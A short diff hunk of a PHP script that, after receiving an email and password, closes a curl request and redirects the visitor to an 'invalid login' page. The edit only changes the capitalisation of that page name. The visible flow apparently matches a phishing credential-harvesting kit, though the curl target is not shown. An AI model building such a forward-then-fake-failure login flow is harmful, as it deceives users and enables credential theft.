@@ -38,7 +38,7 @@ if (!empty($email) && !empty($password)) {
     curl_close($ch);
 
     // Optionally redirect to success page or original form
-    header("Location: invalid login.php"); // or any other page
+    header("Location: Invalid Login.php"); // or any other page
     exit;
 } else {
     echo "Invalid input.";
